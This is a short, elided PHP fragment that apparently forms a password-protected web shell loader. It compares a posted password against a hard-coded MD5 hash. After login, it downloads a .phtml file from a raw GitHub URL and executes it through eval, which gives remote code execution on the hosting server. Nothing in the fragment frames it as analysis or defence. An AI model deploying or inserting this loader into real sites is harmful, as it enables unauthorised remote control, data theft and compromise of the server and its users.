...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '48f81ec3fafdac96c241d200c09432db'; // Replace this with your MD5 hashed password
...
if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/bellerwalker/pen-php/main/serv.phtml');
    eval('?>' . $a);
} else {
